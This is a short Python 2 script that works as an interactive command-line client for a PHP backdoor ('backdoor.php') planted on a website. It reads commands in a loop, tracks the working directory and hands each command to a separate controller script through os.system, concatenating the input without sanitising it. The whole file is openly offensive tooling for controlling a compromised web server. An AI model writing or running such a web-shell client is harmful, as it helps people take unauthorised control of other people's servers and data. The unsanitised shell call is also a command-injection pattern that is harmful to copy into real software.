import sys
import os
if (len(sys.argv)!=2):
    print "Usage: python shell.py [http://site.com/backdoor.php]"
    quit()
url = sys.argv[1]
dir = "/"
while True:
    command = str(raw_input("shell@"+url+">> "))
    if "cd " in command:
        dir = command.split("cd ")[1]
    else:
        os.system('python controller.py '+url+' '+dir+' '+command) 
